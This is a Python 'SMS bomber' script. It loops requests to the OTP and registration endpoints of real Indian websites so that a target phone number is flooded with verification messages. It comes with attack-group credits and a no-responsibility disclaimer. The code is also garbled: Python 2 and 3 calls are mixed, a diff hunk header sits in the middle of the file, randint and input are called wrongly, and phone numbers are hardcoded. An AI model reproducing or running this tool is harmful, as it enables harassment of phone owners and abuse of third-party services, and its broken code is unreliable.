from urllib.request import Request,urlopen
 from urllib.parse import urlencode
 #python2
 #from urllib.request import Request,urlopen
 import urllib2,cookielib
 #from urllib.parse import urlencode
 import platform
 import os
 import time
 from random import randint

 try:
     raw_input
 except NameError:
     raw_input = input

 def banner():
     if platform.system().lower()=="windows":
         os.system("cls")
     else:
         os.system("clear")
     print("""

   /$$$$$$  /$$      /$$  /$$$$$$        /$$$$$$$   /$$$$$$  /$$      /$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$ 
  /$$__  $$| $$$    /$$$ /$$__  $$      | $$__  $$ /$$__  $$| $$$    /$$$| $$__  $$| $$_____/| $$__  $$
 | $$  \__/| $$$$  /$$$$| $$  \__/      | $$  \ $$| $$  \ $$| $$$$  /$$$$| $$  \ $$| $$      | $$  \ $$
 @@ -21,44 +26,37 @@ def banner():
 |  $$$$$$/| $$ \/  | $$|  $$$$$$/      | $$$$$$$/|  $$$$$$/| $$ \/  | $$| $$$$$$$/| $$$$$$$$| $$  | $$
  \______/ |__/     |__/ \______/       |_______/  \______/ |__/     |__/|_______/ |________/|__/  |__/
                                                                                                                                                                                                     
                                    By : D3XBugg3R 
                                    Modded By: Lucas 
                                 With <3 of T34M GCA                                                                                                  
                                    By : D3XBugg3R                                                                                                 
     Note : I won't be responsible for any damage caused by this script, Use at your own risk
 """)
 #http://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=

 #https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=

 #http://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile=

 #http://www.quikr.com/SignIn?aj=1&for=send_otp&user=

 #https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=

 how_many = input("How many numbers do you want to bomb? ")
 numbers = [] 
 for i in range(how_many):
     temp = str(input(f"Enter the number {i+1}: "))
     numbers.append(temp)

 def send(num, counter, slep):
     #url = ["https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=","https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=","https://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile="]
     url="https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile="
     data={"phone":num}
     url="https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="
     #data={"phone":num}
     hdr = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3','Accept-Encoding': 'none','Accept-Language': 'en-US,en;q=0.8','Connection': 'keep-alive'}
     result_url=url+num
     req = urllib2.Request(result_url, headers=hdr)
     for x in range(counter):
         banner()
         print("Target Number          : 89620558442", num)
         print("Number of Message Sent : ", x+20)
         result_url=url+num
         resp1=Request(result_url)
         urlopen(resp1)
         #print("Target Number          : 01531999473", num)
         #print("Number of Message Sent : ", x+1)
         page = urllib2.urlopen(req)
         #resp1=Request(result_url)
         #urlopen(resp1)
         time.sleep(slep)
 try:
     banner()
     for number in numbers:
         send(number, int(input(f"Enter Number of Messages for {number} : ")), randint(3))
     number = raw_input("Enter mobileNumber:89620558442")
     count = raw_input("Enter number of Message: 20")
     throttle = raw_input("Enter time of sleep: 3")
     send(number,int(count), int(throttle))
 except Exception as e:
     print("Something is wrong please Run again this script.")
     print("Something is wrong please Re-run this script.")


